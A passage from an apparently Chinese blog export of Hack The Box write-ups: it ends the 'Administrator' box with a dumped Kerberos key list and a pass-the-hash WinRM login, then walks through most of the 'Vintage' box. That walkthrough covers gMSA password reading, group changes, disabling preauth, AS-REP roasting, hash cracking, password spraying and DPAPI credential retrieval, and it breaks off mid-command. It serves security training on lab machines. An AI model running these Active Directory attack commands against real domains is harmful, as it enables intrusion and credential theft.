grabbed\rAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664\rAdministrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2\rAdministrator:des-cbc-md5:403286f7cdf18385\rkrbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648\rkrbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94\rkrbtgt:des-cbc-md5:2c0bc7d0250dbfc7\radministrator.htb\\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3\radministrator.htb\\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48\radministrator.htb\\olivia:des-cbc-md5:bc2a4a7929c198e9\radministrator.htb\\michael:aes256-cts-hmac-sha1-96:2cfba91e8b2411fe101652e9c51519e40d6c54267d637ee78e7a0d2da917b8cc\radministrator.htb\\michael:aes128-cts-hmac-sha1-96:c5c5efed81e1b0f853fb768e72fa061a\radministrator.htb\\michael:des-cbc-md5:1cb3fd7079a16808\radministrator.htb\\benjamin:aes256-cts-hmac-sha1-96:31e42287be65cb2cfbd6057358db7bc312328b4d9b3956888b13405d891bb4cc\radministrator.htb\\benjamin:aes128-cts-hmac-sha1-96:2771ac747ccbaef1686dc55bd542779c\radministrator.htb\\benjamin:des-cbc-md5:37a4e09ea24ce03e\radministrator.htb\\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4\radministrator.htb\\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218\radministrator.htb\\emily:des-cbc-md5:804343fb6e0dbc51\radministrator.htb\\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f\radministrator.htb\\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f\radministrator.htb\\ethan:des-cbc-md5:58387aef9d6754fb\radministrator.htb\\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6\radministrator.htb\\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade\radministrator.htb\\alexander:des-cbc-md5:49ba9dcb6d07d0bf\radministrator.htb\\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82\radministrator.htb\\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e\radministrator.htb\\emma:des-cbc-md5:3249fba89813ef5d\rDC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb\rDC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d\rDC$:des-cbc-md5:f483547c4325492a\r[*] Cleaning up... 然后使用evil-winrm的hash登录就行\n┌──(root㉿kali)-[/home/kali/Administrator]\r└─# evil-winrm -i administrator.htb -u administrator -H \u0026#34;3dc553ce4b9fd20bd016e098d2d2fd2e\u0026#34; Summary #\r这个machine感觉还是比较友好的。\n通过Bloodhound对域内用户进行分析，可以更好的确定攻击的方向和顺序。\n多打才能多学，windows我吃定你了😡。\n","date":"2024-12-05","externalUrl":null,"permalink":"/posts/2024/12/htb-administrator/","section":"Posts","summary":"","title":"HTB-Administrator","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123\nNmap Scan #\r└─# nmap -sC -sV -T4 -Pn vintage.htb -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-04 01:49:22Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49664/tcp open unknown\r49668/tcp open unknown\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49681/tcp open unknown\r50907/tcp open unknown\r65103/tcp open unknown\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: -13m55s\r| smb2-time: | date: 2024-12-04T01:49:48\r|_ start_date: N/A 发现在3269端口这一行，存在一个名为：DC01 的域控主机，添加到/etc/hosts中\n并且在3268中存在ldap服务器，同时也存在Kerberos服务以及5985winrm服务\nldapsearch #\r└─# ldapsearch -x -H ldap://10.10.11.45 -D \u0026#34;P.Rosa@vintage.htb\u0026#34; -w \u0026#34;Rosaisbest123\u0026#34; -b \u0026#34;DC=vintage,DC=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; sAMAccountName memberOf 各部分解释\nldapsearch: 这是用于查询 LDAP 目录的命令行工具。\n-x: 表示使用简单身份验证，而不是 SASL 认证。\n-H ldap://\u0026lt;IP\u0026gt;: 指定 LDAP 服务器的地址（用实际的 IP 地址替换 \u0026lt;IP\u0026gt;）。\n-D \u0026quot;P.Rosa@vintage.htb\u0026quot;: 绑定 DN（Distinguished Name），即用于登录 LDAP 服务器的用户凭证。\n-w \u0026quot;Rosaisbest123\u0026quot;: 指定绑定用户的密码。\n-b \u0026quot;DC=vintage,DC=htb\u0026quot;: 指定搜索的基础 DN（Base DN），即从哪个节点开始搜索 LDAP 目录。\n\u0026quot;(objectClass=user)\u0026quot;: 这是过滤器，用于指定只查询对象类为 user 的条目。\nsAMAccountName memberOf: 指定要返回的属性。sAMAccountName 是用户的登录名，memberOf 表示用户所属的组。\n使用题目给出的用户信息进行ldap远程登陆，并枚举域中的用户以及所属组\n# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;DC=vintage,DC=htb\u0026gt; with scope subtree\r# filter: (objectClass=user)\r# requesting: sAMAccountName memberOf #\r# Administrator, Users, vintage.htb\rdn: CN=Administrator,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: Administrator\r# Guest, Users, vintage.htb\rdn: CN=Guest,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: Guest\r# DC01, Domain Controllers, vintage.htb\rdn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb\rsAMAccountName: DC01$\r# krbtgt, Users, vintage.htb\rdn: CN=krbtgt,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb\rsAMAccountName: krbtgt\r# gMSA01, Managed Service Accounts, vintage.htb\rdn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb\rsAMAccountName: gMSA01$\r# fs01, Computers, vintage.htb\rdn: CN=fs01,CN=Computers,DC=vintage,DC=htb\rmemberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: FS01$\r# M.Rossi, Users, vintage.htb\rdn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb\rsAMAccountName: M.Rossi\r# R.Verdi, Users, vintage.htb\rdn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb\rsAMAccountName: R.Verdi\r# L.Bianchi, Users, vintage.htb\rdn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: L.Bianchi\r# G.Viola, Users, vintage.htb\rdn: CN=G.Viola,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: G.Viola\r# C.Neri, Users, vintage.htb\rdn: CN=C.Neri,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: C.Neri\r# P.Rosa, Users, vintage.htb\rdn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb\rsAMAccountName: P.Rosa\r# svc_sql, Pre-Migration, vintage.htb\rdn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_sql\r# svc_ldap, Pre-Migration, vintage.htb\rdn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_ldap\r# svc_ark, Pre-Migration, vintage.htb\rdn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_ark\r# C.Neri_adm, Users, vintage.htb\rdn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: C.Neri_adm\r# L.Bianchi_adm, Users, vintage.htb\rdn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb\rsAMAccountName: L.Bianchi_adm\r# search reference\rref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb\r# search reference\rref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb\r# search reference\rref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 21\r# numEntries: 17\r# numReferences: 3 其中存在的一个Computers，其域名为FS01.vintage.htb似乎就是这台机子\n将其添加到/etc/hosts\n# fs01, Computers, vintage.htb\rdn: CN=fs01,CN=Computers,DC=vintage,DC=htb\rmemberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: FS01$ Bloodhound #\r首先要在/etc/resove.conf中添加\n┌──(root㉿kali)-[/home/kali/Vintage]\r└─# cat /etc/resolv.conf\r# Generated by NetworkManager\rsearch localdomain\r#nameserver 192.168.237.2 #根据需要注释掉这一行\rnameserver 10.10.11.45 # Your IP 注释掉192.168.xxx.xxx，我并不知道这是否是必要的，但是我注释掉后能成功\n然后注意同步时区，因为Kerberos的认证有时区的限制\n┌──(root㉿kali)-[/home/kali/Vintage]\r└─# ntpdate dc01.vintage.htb\r2024-12-03 16:24:04.142934 (+0800) -833.126733 +/- 0.034009 dc01.vintage.htb 10.10.11.45 s1 no-leap\rCLOCK: time stepped by -833.126733 然后进行内网信息收集，使用bloodhound\n┌──(root㉿kali)-[/home/kali/Vintage]\r└─# bloodhound-python -u P.Rosa -p \u0026#39;Rosaisbest123\u0026#39; -d vintage.htb -c All -dc dc01.vintage.htb INFO: Found AD domain: vintage.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.vintage.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 2 computers\rINFO: Connecting to LDAP server: dc01.vintage.htb\rINFO: Found 16 users\rINFO: Found 58 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: FS01.vintage.htb\rINFO: Querying computer: dc01.vintage.htb 会在当前目录下生成一些分析后的文件\n安装BloodhoundGUI，同时要安装neo4j数据库\nBloodHoundAD/BloodHound: Six Degrees of Domain Admin (github.com) 导入数据进行分析\n可以发现L.BIANCHI_ADM@VINTAGE.HTB是在域管理员组中的，有管理员权限\n并且GMSA01$@VINTAGE.HTB可以将自己添加到管理员组\n域内关系\n从FS01到GMSA01，可以看到FS01可以读取GMS的密码\n然后GMS可以将自己添加到管理员组\nUser #\r使用GetTGT.py：提供密码、hash或aeskey用来请求TGT并且保存为ccache格式\n└─# impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in FS01$.ccache 将环境变量 KRB5CCNAME 设置为 FS01\\$.ccache，以指定 Kerberos 客户端应该使用的缓存文件\n└─# export KRB5CCNAME=FS01\\$.ccache 使用bloodyAD与 Active Directory 交互，通过 Kerberos 身份验证，从指定的 Active Directory 域控制器获取名为 GMSA01$ 的受管服务账户的密码（存储在 msDS-ManagedPassword 属性中）\n└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k get object \u0026#39;GMSA01$\u0026#39; --attr msDS-ManagedPassword\rdistinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb\rmsDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53\rmsDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g== 通过已知的 GMSA 账户哈希值，尝试从 Active Directory 域控制器获取 Kerberos 票证\n└─# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in GMSA01$.ccache\r└─# export KRB5CCNAME=GMSA01\\$.ccache 然后将P.Rosa添加到SERVICEMANAGERS，使用GMSA的凭证，然后在生成自己的凭证\n└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add groupMember \u0026#34;SERVICEMANAGERS\u0026#34; \u0026#34;P.Rosa\u0026#34;\r[+] P.Rosa added to SERVICEMANAGERS\r└─# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in P.Rosa.ccache\r└─# export KRB5CCNAME=P.Rosa.ccache 尝试使用这个票据来列出不需要Kerberos域认证的用户，先生成域内用户的用户名列表\n└─# ldapsearch -x -H ldap://10.10.11.45 -D \u0026#34;P.Rosa@vintage.htb\u0026#34; -w \u0026#34;Rosaisbest123\u0026#34; -b \u0026#34;DC=vintage,DC=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; sAMAccountName | grep \u0026#34;sAMAccountName:\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2 \u0026gt; usernames.txt └─# cat usernames.txt Administrator\rGuest\rDC01$\rkrbtgt\rgMSA01$\rFS01$\rM.Rossi\rR.Verdi\rL.Bianchi\rG.Viola\rC.Neri\rP.Rosa\rsvc_sql\rsvc_ldap\rsvc_ark\rC.Neri_adm\rL.Bianchi_adm 然后用impact-GetNPUsers列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户\n└─# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User svc_ldap doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User svc_ark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 接下来禁用预认证\n└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH\r[-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_ARK\u0026#39;s userAccountControl\r└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_LDAP\u0026#39;s userAccountControl\r└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_SQL\u0026#39;s userAccountControl 启用账户\n└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_ARK\u0026#39;s userAccountControl\r└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_LDAP\u0026#39;s userAccountControl\r└─# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_SQL\u0026#39;s userAccountControl 再次检查域用户\n└─# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r$krb5asrep$23$svc_sql@VINTAGE.HTB:193416fc53443c06de46d37da3d42166$b35ce4ea605d525055533543a7e9dd10fffc3a65ffc2f33c6961f648c340910cd492095e921ae4acaa30dc45f394e315d8b55ed1a832138d4061fec01cda3a05efe7ff9add64991b10354de2b29e108c905f72a1332a0e3a1d56b3d2023535f6e7bc9ef8435bdbc7152d45ab59e5c69415cc2aea0ffd880746bacda9f29e4d0c394217941623fc8b208aea33d3c3af1c362643c0e502505559d9bd997603673d1e80554ad5483730c8cfd62d4dbcce434cefa88411e7b9902b54c9bc0ec9cf8c9f5da98851eaa44236812e34064a956e45c4a4a911efb16beb6c0bb040a29465468f4a33df5957dd0cb8\r$krb5asrep$23$svc_ldap@VINTAGE.HTB:2e8eb8a54f2e38ceb86cb167ebcfd3a3$4009fa7585adf1b1ce1e62ea59ef0e1db4569403621261a531e062559d9d62eef6bf55b181f10661ddb6de9030ff78d1dcd91a0920ff7c885fb2d85e1e8a2b2bd9894de70f8f6ef413254c150398269766b930f789c8a883b4a45326235480e46fee1db81736e4e1ce86f261a6ea2ddd7c3a6646e59a67b9bf4ff771ccfecc2354df616afedc768a022234517b88b95184b9fbdd90eb43b52ef883720b83be869de267f99ce70da020a4899900c454f3be18a0b85b2c1248a159219c34e85c888edb8f2a09af6d9c4a4d14766d0f248cfbc0a57cdace833cd589aa550de0f9e35ded67ad616ed0adbdbb\r$krb5asrep$23$svc_ark@VINTAGE.HTB:ab991bf5f1ab56057d523c8b04f54993$6d178e1becf696f67f3b6c15f1d67a05570282f82e529a20b932253e72a3a62fd3c6662441c08154a9bd798a3079eb12b4cc104853611229183656c0254292f5b37be0d5a868b0a1b5b4940d40a3be5a1c402e44740b4fa42cd839cde7541268504c924d71b6dd3e6fe72400427d12bd7852cd6e61270b97d006224c5e0732406a6f7598a200e2acbd1d8f4c1ca47c028ab53ddd2d4de9efb98bfb49c2d962fe20bf98fef71d65c48ab252a288f53fac475cce8ddd1e30820a1df9dc058c877ae1e6e1bdcfe3954cbec461dcc085497914c8eb6d910010d4690377bbfedc160b604a1e4132a4e00de923\r[-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set 尝试使用hashcat进行爆破\n└─# hashcat -a 3 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show\r$krb5asrep$23$svc_sql@VINTAGE.HTB:21f3bee616690890b5888e3e18d56582$89e966c8c984fdba49c4a5cb373407959a53c78fe823bcb599e4bff22df326780d2a869ed1572467797244c4b2f50a49af143612ee467dba34784a66a5805ad1d556e129838c3107a40259d80edafb2e6f88c80a77a4b3d30d5069a69d3a6b7f001f2fa3251faa17706a7fd255a96c3bfadf10f93e049b0fcc1f41227af5dbefee1ae906f23bfc4d1c6b0f7a8f4328ecce63b45e6944157f88d814830c568fb59763f1d6e785736d5ec368c6d27968c399eaa339067dc32783df85920ae876d3241bace19475691d6373cd0700771659a90d15a4cfeeb1dd89a5a6659b2c6316863e475ce228ac83274f:Zer0the0ne 得到SVC_SQL密码：Zer0the0ne\n使用kerbrute对user进行爆破\nReleases · ropnop/kerbrute (github.com) └─# ./kerbrute --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop\r2024/12/04 09:36:16 \u0026gt; Using KDC(s):\r2024/12/04 09:36:16 \u0026gt; vintage.htb:88\r2024/12/04 09:36:16 \u0026gt; [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] FS01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] DC01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] Administrator@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_ark@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_ldap@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [+] VALID LOGIN: C.Neri@vintage.htb:Zer0the0ne\r2024/12/04 09:36:17 \u0026gt; Done! Tested 17 logins (1 successes) in 0.481 seconds\r账户 C.Neri@vintage.htb 使用密码 Zer0the0ne 成功登录\n获取这个账户的凭证\n└─# impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in c.neri.ccache\r└─# export KRB5CCNAME=c.neri.ccache 然后用5985端口远程登录\n└─# evil-winrm -i dc01.vintage.htb -r vintage.htb 获取到User.txt\nRoot #\r什么是 DPAPI？ #\rDPAPI（Data Protection API）是 Windows 操作系统中的一个加密 API，旨在保护敏感数据，比如密码、私钥、凭据等。它为应用程序提供了加密和解密数据的能力，同时隐藏了复杂的加密操作，简化了加密过程。DPAPI 的设计目的是确保只有当前用户或系统能够访问这些加密数据。\nDPAPI 的工作原理 #\r加密：当一个应用程序或 Windows 系统需要存储敏感信息时，它可以通过 DPAPI 将数据加密。加密使用的是用户的登录凭据（如用户的登录密码或计算机的密钥）来生成加密密钥。\n解密：只有在相同的用户上下文中，DPAPI 才能使用相同的密钥来解密数据。这样，如果一个应用程序或服务尝试访问加密的凭据或数据，只有当前登录用户或者管理员可以解密并访问这些信息。\n安全性：DPAPI 是基于 Windows 操作系统中的账户认证信息的，因此它的加密密钥与用户的登录凭据紧密关联，保证只有特定用户才能访问其自己的加密数据。\n这里通过DPAPI来获取Windows的身份凭证\n*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; dir -h\rDirectory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\rMode LastWriteTime Length Name\r---- ------------- ------ ----\r-a-hs- 6/7/2024 5:08 PM 430 C4BB96844A5C9DD45D5B6A9859252BA6\r*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt;download C4BB96844A5C9DD45D5B6A9859252BA6 *Evil-WinRM* PS 